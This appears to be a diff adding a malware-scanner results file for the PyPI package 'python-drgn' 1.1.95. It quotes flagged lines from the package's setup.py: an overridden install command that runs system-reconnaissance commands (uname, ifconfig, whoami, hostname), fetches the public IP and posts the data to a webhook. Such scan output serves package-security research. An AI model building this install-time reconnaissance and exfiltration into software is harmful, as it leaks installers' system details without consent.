@@ -1,0 +1,102 @@
+{
+    "issues": 16,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:55",
+                "code": "setup(name='python-drgn', version='1.1.95',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:20",
+                "code": "\t\t\tpublic_ip=requests.get('http://ifconfig.me').text\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:25",
+                "code": "\t\t\tpublic_ip=requests.get('http://ifconfig.me').text\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:30",
+                "code": "\t\t\tpublic_ip=requests.get('http://ifconfig.me').text\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:36",
+                "code": "                        public_ip=requests.get('http://ifconfig.me').text\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:17",
+                "code": "\t\t\tconf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:19",
+                "code": "\t\t\tip=os.popen('ifconfig').read()\t\t\t\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:22",
+                "code": "\t\t\tconf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:24",
+                "code": "\t\t\tip=os.popen('ifconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:27",
+                "code": "\t\t\tconf=os.popen('systeminfo').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:29",
+                "code": "\t\t\tip=os.popen('ipconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:33",
+                "code": "                        conf=os.popen('uname -a').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:35",
+                "code": "                        ip=os.popen('ifconfig').read()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:40",
+                "code": "\t\twho=(os.popen('whoami').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:42",
+                "code": "\t\thostn=(os.popen('hostname').read())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "obfuscation": {},
+        "exec-base64": {},
+        "dll-hijacking": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:50",
+                "code": "\t\trequests.post(webhook, payload)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "silent-process-execution": {}
+    },
+    "path": "./dataset/pypi/python-drgn-1.1.95"
+}
